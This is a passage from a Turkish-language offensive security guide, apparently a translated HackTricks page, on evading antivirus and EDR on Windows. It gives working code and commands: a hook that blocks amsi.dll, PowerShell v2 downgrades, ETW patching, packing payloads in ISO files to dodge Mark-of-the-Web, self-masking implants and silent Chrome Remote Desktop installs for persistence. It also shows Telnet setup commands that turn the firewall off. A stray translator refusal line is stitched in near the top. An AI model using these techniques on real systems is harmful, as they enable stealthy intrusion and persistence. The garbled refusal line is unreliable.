NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Bu içerik, AMSI’yi ve AV/EDR tespitini atlatmaya yönelik uygulanabilir talimatlar içerdiğinden çeviremiyorum. İstersen savunma ve tespit odaklı güvenli bir Türkçe özet hazırlayabilirim.

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging, bir sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Denetim ve sorun giderme amacıyla kullanışlı olabilir, ancak **tespit edilmekten kaçınmak isteyen saldırganlar için sorun oluşturabilir**.

PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
- **PowerShell sürüm 2'yi kullanın**: PowerShell sürüm 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI taramasından geçmeden çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Yönetilmeyen bir PowerShell oturumu kullanın**: PowerShell'i `powershell.exe` başlatmadan barındırmak için [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobalt Strike'ın `powerpick` tarafından kullanılan yaklaşım). Bu, özellikle `powershell.exe` sürecine bağlı denetimleri atlatır; ancak AMSI'yi, Script Block Logging'i veya diğer tüm PowerShell savunmalarını kendiliğinden devre dışı bırakmaz. Kapsam, çalışma zamanına ve host uygulamasına bağlıdır.


## Obfuscation

> [!TIP]
> Bazı obfuscation teknikleri verileri şifrelemeye dayanır. Bu, binary'nin entropisini artırarak AV'lerin ve EDR'lerin onu daha kolay tespit etmesine yol açabilir. Dikkatli olun; şifrelemeyi yalnızca hassas olan veya gizlenmesi gereken belirli kod bölümlerine uygulamayı tercih edebilirsiniz.

### ConfuserEx ile Korunmuş .NET Binary'lerinin Obfuscation'ını Giderme

ConfuserEx 2 (veya ticari fork'ları) kullanan malware'i analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki iş akışı, daha sonra dnSpy veya ILSpy gibi araçlarla C#'a decompile edilebilecek **orijinale yakın bir IL'yi güvenilir biçimde geri yükler**.<sup>[[10]](#references)</sup>

1.  Anti-tampering korumasını kaldırma – ConfuserEx her *method body*'yi şifreler ve bunu *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum değerini değiştirir; bu nedenle yapılacak herhangi bir değişiklik binary'nin çökmesine neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR anahtarlarını kurtarmak ve temiz bir assembly yazmak için **AntiTamperKiller** kullanın:
   ```bash
   # https://github.com/wwh1004/AntiTamperKiller
   python AntiTamperKiller.py Confused.exe Confused.clean.exe
   ```
   Çıktı, kendi unpacker’ınızı oluştururken işinize yarayabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2.  Sembol / control-flow kurtarma – *temiz* dosyayı **de4dot-cex**’e (ConfuserEx uyumlu bir de4dot fork’u) verin.
   ```bash
   de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
   ```
   Bayraklar:
     • `-p crx` – ConfuserEx 2 profilini seçer
     • de4dot control-flow flattening'i geri alır, özgün namespace'leri, class'ları ve variable adlarını geri yükler ve constant string'leri çözer.

3.  Proxy-call'lerin kaldırılması – ConfuserEx, decompilation'ı daha da zorlaştırmak için doğrudan method çağrılarını hafif wrapper'larla (diğer adıyla *proxy call'ler*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
   ```bash
   ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
   ```
   Bu adımdan sonra opak wrapper fonksiyonları (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'lerini görmelisiniz.

4.  Manuel temizleme – ortaya çıkan binary'yi dnSpy altında çalıştırın ve *gerçek* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman bunu `<Module>.byte_0` içinde başlatılan, TLV kodlamalı bir byte dizisi olarak saklar.

Yukarıdaki zincir, kötü amaçlı örneği çalıştırmaya **gerek kalmadan** yürütme akışını geri yükler – çevrimdışı bir iş istasyonunda çalışırken kullanışlıdır.

> 🛈  ConfuserEx, örnekleri otomatik olarak triyaj etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute oluşturur.

#### Tek satırlık komut
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla yazılım güvenliğini artırabilen, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork'unu sunmaktır.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir harici araç kullanmadan ve derleyiciyi değiştirmeden, derleme zamanında obfuscated kod üretmek için `C++11/14` dilinin nasıl kullanılabileceğini gösterir.
- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework'ü tarafından üretilen obfuscated işlemlerden oluşan bir katman ekler.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz; .exe, .dll ve .sys dosyaları dahil olmak üzere çeşitli PE dosyalarını obfuscate edebilen bir x64 binary obfuscator'dır.
- [**metame**](https://github.com/a0rtega/metame): Metame, keyfi yürütülebilir dosyalar için basit bir metamorphic code engine'dir.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan ve LLVM tarafından desteklenen diller için ayrıntılı bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly kodu düzeyinde obfuscate eder ve böylece normal control flow'a ilişkin doğal algımızı boşa çıkarır.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL dosyalarını shellcode'a dönüştürüp yükleyebilir.

### LLVM derleyicisi destekli, fonksiyon başına self-masking

Değiştirilmiş bir LLVM X86 backend'i, implantın tamamını yalnızca uykuya geçtiğinde maskelemek yerine seçili fonksiyonları etkin olmadıkları sürece XOR-maskeli tutabilir. Function Peekaboo PoC'si, demangle edilmiş adında `REG_` bulunan fonksiyonları seçer, son makine kodunun çevresine konumdan bağımsız giriş/çıkış stub'ları ekler ve `.text` içine paylaşılan tek bir masking handler yerleştirir; kaynak düzeyindeki imzalar ve Windows x64 calling convention değişmeden kalır.<sup>[[38]](#references)[[39]](#references)</sup>

#### Backend control-flow dönüşümü

Dönüşümün **her üretilen return'ü** kapsaması ve x86 düzeninin tam olarak bilinmesi gerektiğinden, bu işlem instruction selection ve optimizasyondan sonra yapılmalıdır. Emission öncesi bir `MachineFunctionPass`, son `MachineInstr::isReturn()` talimatını bulup siler; böylece son yol eklenen epilogue'a düşer. Önceki return'leri `JMP_1 handler` ile değiştirir. Her return'den önce derleyicinin ürettiği stack/frame teardown talimatlarını koruyun; yalnızca return talimatını yönlendirin.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` ve `X86AsmPrinter::emitFunctionBodyEnd()` fonksiyon başına stub'ları, `emitEndOfAsmFile()` ise handler'ı üretir. Emission aşamaları arasında paylaşılan semboller, prologue'daki bir branch'in daha sonra üretilecek epilogue'u hedeflemesini sağlar. Elle üretilen bir near `je` için `0F 84` baytlarını ve ardından `target - address_after_je` MC ifadesinin dört baytını yazın. Handler'a yapılan çağrılar ve atlamalar bunun yerine `MCInst` nesneleriyle (`CALL64pcrel32` ve `JMP_1`) üretilebilir. Değişiklik yapmadığı seçilmemiş bir fonksiyon için pass `false` döndürmelidir; PoC bu durumda yanlışlıkla `true` döndürür.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata ve pre-CRT başlatma

PoC, `.funcmeta` içine bir XOR key'i ve loader tarafından relocate edilmiş fonksiyon işaretçisiyle runtime uzunluğunu içeren 16 baytlık kayıtlar yerleştirir. C alanı `uint32_t` olsa da handler, kayıt ofseti `+8` noktasında bir QWORD'a erişir; böylece uzunluk ve padding'i tüketir ve kayıtlar arasında `0x10` ilerler. PE section adları yalnızca sekiz bayt olabildiğinden runtime araması `.funcmet` adını görür. Harici bir patcher, çalıştırılabilir `.stub` ekler, eski entry-point RVA'sını stub içinde saklar ve `AddressOfEntryPoint` değerini değiştirir. PIC stub, image base'i `gs:[0x60]` → `[PEB+0x10]` yoluyla alır, önceden import edilmiş bir `VirtualProtect` işlevini çözmek için PE32+ import'larını tarar ve CRT'den önce çalışır.<sup>[[38]](#references)[[39]](#references)</sup>

Başlatma sırasında `gs:[0xE8]` içine bir sentinel yazılır ve metadata'daki her fonksiyon çağrılır. Sürekli okunabilir durumdaki prologue, fonksiyon başlangıcını `gs:[0xF0]` içine kaydeder, sentinel'i denetler ve henüz maskelenmemiş gövdeyi atlar. Ardından epilogue `call handler` kullanır. Handler 13 register'ı (`0x68` bayt) kaydettikten sonra `[rsp+0x68]` konumundaki return address, dönüştürülmüş fonksiyonun sonunu gösterir; böylece `end - start` değeri metadata kaydına yazılabilir. Tüm gövdeler maskelendikten sonra stub sentinel'i temizler ve `ImageBase + original_entry_point_RVA` adresine atlar.<sup>[[38]](#references)[[39]](#references)</sup>

Normal bir çağrı sırasında prologue, gövdenin şifresini çözmek için aynı symmetric handler'ı çağırır. Son yol eklenen epilogue'a düşerken, önceki her return doğrudan paylaşılan handler'a atlar. Normal epilogue da `call` yerine `jmp handler` kullanır. Böylece yeniden maskeleme sonrasında handler'ın `ret` talimatı, çağıranın özgün return address'ini kullanır ve fonksiyon sonucunu `RAX` içinde korur.<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive ve analiz göstergeleri

Handler geçerli kaydı bulur, sabit ve görünür prologue'u (`bu derlemede 0x46` bayt) atlar, kalan bölgeyi `PAGE_EXECUTE_READWRITE` yapar, düşük key baytıyla byte-by-byte XOR uygular ve ardından bölgeyi `PAGE_EXECUTE_READ` olarak ayarlar. Dolayısıyla aynı döngü girişte şifreyi çözer, her normal çıkışta ise yeniden şifreler.<sup>[[38]](#references)[[39]](#references)</sup>

Bu tasarımın belirgin göstergeleri şunlardır:<sup>[[38]](#references)[[39]](#references)</sup>

- çalıştırılabilir bir `.stub` içindeki entry point ve key ile relocate edilmiş `.text` işaretçilerini tutan bir `.funcmet` bölümü;
- pre-CRT PEB, import table ve section table ayrıştırmasının ardından her metadata işaretçisi üzerinden yapılan çağrılar;
- birbirinin aynısı `call`/`pop` PIC prologue'ları ve tek bir handler'a yönlendirilen çok sayıda return noktası;
- `gs:[0xE8]`, `gs:[0xF0]` ve `gs:[0xF8]` adreslerine yapılan yazmaların ardından tekrarlanan `VirtualProtect` geçişleri ve image-backed çalıştırılabilir sayfalara yapılan byte-by-byte XOR yazmaları.

Bu, cryptographic protection değil, memory-scanner evasion yöntemidir: patch'lenmiş dosya hâlâ orijinal clear body'yi içerir ve debugger ile `VirtualProtect` ya da XOR döngüsünde breakpoint koyup etkin fonksiyon dump edilebilir. Tek baytlık XOR, okunabilir metadata ve sabit `0x46` sınırı da dosya dışından kurtarmayı kolaylaştırır.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoC'nin TEB slot'ları thread-local olsa da değiştirilmiş kod sayfaları process-wide'dır. Bu nedenle eşzamanlı veya özyinelemeli girişler, başka bir çağrı yürütülürken talimatların yeniden toggle edilmesine yol açabilir; exception'lar ve nonlocal exit'ler de yeniden maskelemeyi atlayabilir. Sağlam bir uygulama geçişleri senkronize etmeli, `lpflOldProtect` üzerinden döndürülen gerçek korumayı geri yüklemeli, hard-coded stub uzunluklarından kaçınmalı, x64 stack alignment açısından hem `call` hem de `jmp` yollarını denetlemeli ve çalıştırılabilir baytları yeniden yazdıktan sonra `FlushInstructionCache` çağırmalıdır. Microsoft, çalıştırılabilir kod değiştirildiğinde instruction-cache tutarlılığını sağlama sorumluluğunu açıkça çağırana yükler.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen ve MoTW

İnternetten bazı yürütülebilir dosyaları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak kötü amaçlı uygulamaları çalıştırmaya karşı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen temel olarak itibara dayalı bir yaklaşım kullanır; yani nadiren indirilen uygulamalar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve dosyayı çalıştırmasını engeller (ancak More Info -> Run anyway seçeneğine tıklayarak dosya yine de çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir. İnternetten indirilen dosyalar oluşturulurken otomatik olarak eklenir ve dosyanın indirildiği URL'yi içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosyanın Zone.Identifier ADS'sini kontrol etme.</p></figcaption></figure>

> [!TIP]
> **Güvenilir** bir signing certificate ile imzalanmış yürütülebilir dosyaların **SmartScreen'i tetiklemeyeceğini** unutmayın.

Payload'larınızın Mark of The Web almasını önlemenin çok etkili bir yolu, onları ISO gibi bir container içine paketlemektir. Bunun nedeni, Mark-of-the-Web'in (MOTW) **NTFS olmayan** birimlere **uygulanamamasıdır**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/), Mark-of-the-Web'i atlatmak için payload'ları çıktı container'larına paketleyen bir araçtır.

Kullanım örneği:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Here is a demo showing how to bypass SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları kaydetmesini** sağlayan güçlü bir günlükleme mekanizmasıdır. Ancak güvenlik ürünleri tarafından kötü amaçlı etkinlikleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin devre dışı bırakılmasına (bypass edilmesine) benzer şekilde, kullanıcı alanındaki işlemin **`EtwEventWrite`** işlevinin herhangi bir olay kaydetmeden hemen geri dönmesini sağlamak da mümkündür. Bunun için işlev bellekte yamalanarak hemen geri dönmesi sağlanır ve böylece ilgili işlem için ETW günlüklemesi etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgiye **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** adreslerinden ulaşabilirsiniz.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binary dosyalarını belleğe yükleme yöntemi uzun zamandır biliniyor ve AV'ye yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok etkili bir yöntem.

Payload diske dokunmadan doğrudan belleğe yükleneceği için yalnızca tüm işlem için AMSI'yi yamalamamız yeterli.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc vb.) C# assembly'lerini doğrudan bellekte çalıştırma olanağını zaten sunuyor; ancak bunu yapmanın farklı yolları var:

- **Fork\&Run**

Bu yöntem, **yeni bir gözden çıkarılabilir process başlatmayı**, post-exploitation amaçlı kötü amaçlı kodunuzu bu yeni process'e enjekte etmeyi, kodu çalıştırmayı ve tamamlandığında yeni process'i sonlandırmayı içerir. Bu yöntemin hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, çalıştırmanın Beacon implant process'imizin **dışında** gerçekleşmesidir. Bu, post-exploitation işlemlerimiz sırasında bir şey ters giderse veya tespit edilirse implantımızın **hayatta kalma olasılığının çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation amaçlı kötü amaçlı kodu **kendi process'ine** enjekte etmekle ilgilidir. Böylece yeni bir process oluşturup AV'ye taratmak zorunda kalmazsınız; ancak payload'ınız çalışırken bir şeyler ters giderse çökebileceğinden **beacon'ınızı kaybetme olasılığınız çok daha yüksektir**.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla bilgi edinmek isterseniz şu makaleye [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve InlineExecute-Assembly BOF'larına ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)) göz atın.

C# Assembly'lerini **PowerShell üzerinden** de yükleyebilirsiniz; [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) sayfalarına göz atın.

## .NET araçlarını NativeAOT WebAssembly'ye yeniden paketleme (WasmForge)

Standart `execute-assembly` teknikleri, tanınabilir MSIL'i korur ve sonunda bir CLR başlatır. **WasmForge** bunun yerine yürütme altyapısını değiştirir: C# projesini deneysel NativeAOT-LLVM WASI hedefine taşır, önceden WebAssembly'ye derler ve modülü Wazero tabanlı bir Windows PE host'una gömer. Ortaya çıkan process hedef sistemin CLR'ına, JIT'ine veya `dotnet` host'una ihtiyaç duymaz; bu nedenle yalnızca yönetilen assembly adlarına, CLR yüklemesine, AMSI'ye veya .NET ETW'ye dayanan kuralların doğrudan görünürlüğü azalır. Bu bir kaçınma/paketleme tekniğidir, ayrıcalık sınırını aşma yöntemi değildir; guest, orijinal aracın izinlerini ve gözlemlenebilir OS davranışını korur.<sup>[[44]](#references)[[45]](#references)</sup>

### C# projesi derleme

Önerilen derleme yöntemi, .NET 10 SDK'sını, NativeAOT-LLVM workload'unu, WASI SDK 24.0'ı, linker'ı ve imzalama bağımlılıklarını içeren projenin Docker ortamını kullanmaktır. `.csproj` dosyası otomatik olarak algılanır; tek adımlı derleme taşıma, uyumluluk yamalama, WASM derlemesi, PE oluşturma ve imzalama işlemlerini gerçekleştirir.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Sorun giderme veya oluşturulan kodu gözden geçirme için süreci `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` ve son olarak `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>` adımlarına bölün. Derleme imajı, WASI Preview 2 bileşen kodlamasını önleyip gömülü runtime'ın beklediği düz modülü üretmek için bir `wasm-component-ld` wrapper'ı da kullanır.<sup>[[44]](#references)[[45]](#references)</sup>

### wasm32 C# ile x64 Win32 Arasında Köprü Kurma

Bu, şeffaf bir yeniden derleme değildir. NativeAOT-WASI, Windows odaklı BCL özelliklerinden yoksundur veya bunları değiştirir; ayrıca wasm32 guest genellikle dört baytlık işaretçi yuvaları ayırırken x64 API'leri sekiz baytlık işaretçiler döndürebilir. WasmForge bu iki sorunu aşağıdaki oluşturulan katmanlarla çözer:<sup>[[44]](#references)</sup>

1. Bir kaynak patcher'ı, AOT'ye özgü anlamsal farklılıkları giderir ve desteklenmeyen registry, pipes, WMI, identity, directory-service, file-version, LSA ve benzeri çağrıları `Wf*` helper'larına yönlendirir.
2. Bir P/Invoke tarayıcısı, `[DllImport]` çağrılarının guest içinde belirtilen DLL'yi dinamik olarak yüklemek yerine bağlantılı C bridge sembollerine bağlanması için NativeAOT `DirectPInvoke` eşlemeleri üretir.
3. Host'a bağlı işaretçiler C#'ta `ulong`, C'de `uint64_t` kullanır. Genel bir dispatcher çağrıyı host'un Win32 handler'ına iletir; `out8_mask`, üst yarıları korunması gereken gerçek sekiz baytlık çıktı yuvalarını işaretler. İşaretlenmemiş wasm32 biçimli çıktılar, x64 yazma işleminin bitişik dört bayta zarar vermemesi için snapshot/restore koruması kullanır.
4. Özel host bridge'leri, LSA ticket-cache erişimi, yapılandırılmış sonuçlar içeren Kerberos/BCrypt işlemleri, TCP KDC trafiği ve LDAP sorguları gibi genel syscall dispatch'e uymayan işlemleri yürütür.

Örneğin `version.dll!VerQueryValueW` için bir wrapper, dört host adresi iletir ve `2` ile `3` bitlerini (`0xC`) ayarlar; çünkü değer işaretçisi ve uzunluk, sekiz baytlık çıktı yuvalarıdır. Wrapper'ın kendisi genel yapıda kalır ve DLL adını, export adını, argümanları ve maskeyi `wf_call_v2`'ye aktarır; host ise işaretçi dönüşümünü yapar ve yerel API'yi çağırır.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Sınırlamalar ve tespit noktaları

Yansıma yoğun kod, dinamik assembly yükleme, keyfi native callback'ler ve WASM belleğine döndürülen karmaşık x64 yapıları hâlâ araç başına yamalar gerektirebilir veya tamamen başarısız olabilir. Genel WASI Preview 2 soketleri no-op stub'lara da ulaşabilir; bu nedenle desteklenen araçlar protokole özgü host shim'leri kullanır. Özellik eşitliğini varsaymak yerine her komutu native bir derlemeyle doğrulayın.<sup>[[44]](#references)[[45]](#references)</sup>

Bu teknik, payload'u görünmez hâle getirmek yerine telemetriyi başka bir yere kaydırır. Tespit; bir WASM modülü içeren veya bellekte oluşturan PE dosyasına, Wazero benzeri runtime davranışlarına, olağandışı host/guest bellek ayırma ve kopyalama işlemlerine, genel doğrudan Win32 çağrılarına, imzalama ve PE kaynağı anormalliklerine ve bunların sonucunda oluşan API çağrıları ile ağ trafiğine yönelebilir. Bu nedenle CLR yükleme, AMSI veya .NET ETW olaylarının bulunmaması, sürecin zararsız olduğunun kanıtı olarak görülmemelidir.<sup>[[44]](#references)</sup>

## Diğer Programlama Dillerini Kullanma

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) adresinde önerildiği gibi, ele geçirilmiş makineye **Saldırganın Kontrolündeki SMB paylaşımında yüklü yorumlayıcı ortamına erişim vererek** diğer dillerle kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımındaki yorumlayıcı ikililerine ve ortama erişim vererek, ele geçirilmiş makinenin belleğinde bu dillerle **keyfi kod çalıştırabilirsiniz**.

Depoda belirtildiği üzere: Defender betikleri taramaya devam eder, ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** elde ederiz. Bu dillerde rastgele, gizlenmemiş reverse shell betikleriyle yapılan testler başarılı olmuştur.

## Statik analizden kaçınmak için WebAssembly'yi yeniden barındırma

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping, EDR veya AV gibi bir güvenlik ürününün access token'ını değiştirir. Token'ın ayrıcalıklarını azaltmak, sürecin çalışmaya devam etmesini sağlarken ayrıcalıklı denetim veya düzeltme işlemlerini gerçekleştirmesini engelleyebilir.

Bunu önlemek için Windows, **harici süreçlerin** güvenlik süreçlerinin token'ları üzerinde handle almasını engelleyebilir.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılımları Kullanma

### Chrome Remote Desktop

[**Bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın PC'sine Chrome Remote Desktop'ı dağıtıp ardından onu ele geçirmek ve kalıcılığı sürdürmek kolaydır:<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH" seçeneğine tıklayın, ardından MSI dosyasını indirmek için Windows MSI dosyasına tıklayın.
2. Kurulum programını kurbanda sessizce çalıştırın (admin gerekir): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next'e tıklayın. Sihirbaz yetkilendirme isteyecektir; devam etmek için Authorize düğmesine tıklayın.
4. Verilen komutu gerekli değişikliklerle çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (`--pin` parametresi, GUI'yi kullanmadan PIN'i ayarlar).
 

## Gelişmiş Evasion

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Evasion çok karmaşık bir konudur; bazen tek bir sistemdeki birçok farklı telemetri kaynağını hesaba katmanız gerekir. Bu nedenle, olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkânsızdır.

Karşılaşacağınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94) tarafından yapılan bu konuşmayı izlemenizi önemle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu da [@mariuszbit](https://twitter.com/mariuszbit) tarafından Evasion in Depth hakkında yapılmış başka bir harika konuşma.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi bölümleri kötü amaçlı bulduğunu kontrol etme**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanarak **ikili dosyanın bölümlerini kaldırabilir**, **Defender'ın hangi bölümü** kötü amaçlı bulduğunu belirleyebilir ve bu bölümü size ayırmasını sağlayabilirsiniz.\
Aynı işi yapan bir diğer araç ise [**avred**](https://github.com/dobin/avred); bu hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde açık bir web arayüzüyle sunar.

### **Telnet Server**

Windows10'a kadar tüm Windows sürümlerinde, (administrator olarak) yükleyebileceğiniz bir **Telnet server** bulunuyordu. Bunu şöyle yapabilirsiniz:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Sistem başlatıldığında **başlamasını** sağlayın ve şimdi **çalıştırın**:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**telnet portunu değiştir** (stealth) ve firewall'u devre dışı bırak:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Buradan indirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup'ı değil, bin downloads dosyalarını istiyorsunuz)

**HOST ÜZERİNDE**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanında bir parola belirleyin
